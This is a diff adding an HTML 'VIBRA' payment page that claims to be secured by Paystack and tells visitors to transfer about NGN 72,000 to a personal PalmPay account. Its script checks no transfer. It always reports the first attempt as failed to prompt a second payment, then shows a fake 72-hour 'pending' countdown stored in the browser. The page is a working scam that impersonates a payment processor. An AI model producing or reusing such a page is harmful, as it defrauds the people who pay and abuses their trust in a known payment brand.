@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>VIBRA – Payment Processing</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+    margin:0;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
+    background:#fff;
+    color:#111;
+}
+
+.container{
+    max-width:520px;
+    margin:auto;
+    padding:20px;
+}
+
+.header{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:600;
+    font-size:16px;
+    margin-bottom:20px;
+}
+
+.amount{
+    color:#00b87c;
+    font-weight:700;
+}
+
+.box{
+    background:#f5f5f5;
+    border-radius:12px;
+    padding:16px;
+    margin:20px 0;
+}
+
+.label{
+    font-size:12px;
+    color:#666;
+}
+
+.value{
+    font-size:16px;
+    font-weight:500;
+    margin-bottom:14px;
+}
+
+.btn{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:8px;
+    background:#f5f5f5;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.secure{
+    text-align:center;
+    margin-top:30px;
+    font-size:12px;
+    color:#777;
+}
+
+/* STATUS SCREENS */
+.status{
+    display:none;
+    text-align:center;
+    padding:50px 20px;
+}
+
+.spinner{
+    width:50px;
+    height:50px;
+    border:5px solid #eee;
+    border-top:5px solid #00b87c;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin:0 auto 20px;
+}
+/* VIBRA – Transparent Receiver Box */
+.vibra-receiver-box{
+  background: rgba(0,0,0,0.03);
+  border: 1px solid rgba(0,0,0,0.08);
+  border-radius: 10px;
+  padding: 12px 14px;
+  margin: 12px 0;
+  font-size: 13px;
+}
+
+.vibra-receiver-title{
+  font-weight: 600;
+  font-size: 13px;
+  margin-bottom: 8px;
+  color: #000;
+}
+
+.vibra-row{
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 6px;
+  color: #444;
+}
+
+.vibra-row strong{
+  font-weight: 600;
+  color: #000;
+}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.failed h2{color:#d93025}
+.pending h2{color:#f29900}
+
+.countdown{
+    font-weight:700;
+    color:#00b87c;
+    margin-top:10px;
+}
+.footer-buttons { display: flex; gap: 10px; }
+.footer-buttons button { flex: 1; padding: 10px; font-size: 14px; border-radius: 6px; border: 1px solid #ccc; background: #fff; cursor: pointer; }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div id="payment">
+
+    <div class="header">
+        <img src="https://img.icons8.com/ios-filled/50/000000/bank.png" height="18">
+        Pay with Transfer
+    </div>
+
+    <div class="label">Vibrasupport@gmail.com</div>
+    <div class="amount">Pay NGN 72,268.50</div>
+
+    <div class="box">
+      <div><div class="label"></div>
+      <div class="value">Oladunnim452{aimtoget}</div></div>
+
+        <div class="label">BANK</div>
+        <div class="value">PALMPAY LTD</div>
+
+        <div class="label">ACCOUNT NUMBER</div>
+        <div class="value">667 367 3977</div>
+
+        <div class="label">AMOUNT</div>
+        <div class="value">NGN 72,268.50</div>
+    </div>
+
+    <button class="btn" onclick="handlePayment()">I’ve sent the money</button>
+    <br><br>
+<div class="footer-buttons"> <button class="vc"><a class="vc" style="outline: none; border: none;" href="./pay.html">↯ Change Payment Method</a></button> <button class="vc"><a class="vc" style="outline: none; border: none;" href="./paystack.html">✕ Cancel Payment</a></button> </div>
+    <div class="secure">🔒 Secured by <b>Paystack</b></div>
+</div>
+
+<!-- LOADING -->
+<div class="status" id="loading">
+    <div class="spinner"></div>
+    <div>Verifying your transfer…</div>
+</div>
+
+<!-- FAILED -->
+<div class="status failed" id="failed">
+    <h2>Payment Failed</h2>
+    <p>
+        We could not confirm this transfer at the moment.
+        This usually happens due to delayed bank settlement,
+        incorrect transfer reference, or network synchronization issues.
+    </p>
+    <p>
+        If you have already made the transfer, please retry verification.
+    </p>
+</div>
+
+<!-- PENDING -->
+<div class="status pending" id="pending">
+    <h2>Payment Pending</h2>
+    <!-- <p>
+        Your payment has been received and is currently under bank confirmation.
+        Some transfers require additional settlement time between banks.
+    </p> -->
+    <p>
+        Payment is expected to be completed within the next <b>1 hour</b>.
+       If confirmation is not received within this timeframe,
+       the system will continue monitoring the transaction for up to <b>72 hours</b>.
+    </p>
+    <div class="countdown" id="timer"></div>
+    <br><br>
+    <div class="vibra-receiver-box">
+  <!-- <div class="vibra-receiver-title">Receiver Account Details</div> -->
+
+  <div class="vibra-row">
+    <span>Account Name</span>
+    <strong>Oladunnim452{aimtoget}</strong>
+  </div>
+
+  <div class="vibra-row">
+    <span>Bank</span>
+    <strong>PALMPAY LTD</strong>
+  </div>
+
+  <div class="vibra-row">
+    <span>Account Number</span>
+    <strong>6673673977</strong>
+  </div>
+</div>
+
+</div>
+
+</div>
+
+<script>
+const CLICK_KEY="vibra_clicks";
+const PENDING_END="vibra_pending_end";
+
+function handlePayment(){
+    let clicks=Number(localStorage.getItem(CLICK_KEY)||0)+1;
+    localStorage.setItem(CLICK_KEY,clicks);
+
+    hideAll();
+    document.getElementById("loading").style.display="block";
+
+    setTimeout(()=>{
+        hideAll();
+        if(clicks===1){
+            document.getElementById("failed").style.display="block";
+        }else{
+            startPending();
+        }
+    },18000);
+}
+
+function startPending(){
+    let end=localStorage.getItem(PENDING_END);
+    if(!end){
+        end=Date.now()+72*60*60*1000;
+        localStorage.setItem(PENDING_END,end);
+    }
+    document.getElementById("pending").style.display="block";
+    updateTimer();
+    setInterval(updateTimer,1000);
+}
+
+function updateTimer(){
+    const end=Number(localStorage.getItem(PENDING_END));
+    const diff=end-Date.now();
+    if(diff<=0)return;
+    const h=Math.floor(diff/3600000);
+    const m=Math.floor(diff%3600000/60000);
+    const s=Math.floor(diff%60000/1000);
+    document.getElementById("timer").textContent=
+        `${h}h ${m}m ${s}s remaining`;
+}
+
+function hideAll(){
+    ["payment","loading","failed","pending"].forEach(id=>{
+        document.getElementById(id).style.display="none";
+    });
+}
+
+if(localStorage.getItem(PENDING_END)){
+    hideAll();
+    startPending();
+}
+</script>
+
+</body>
+</html>
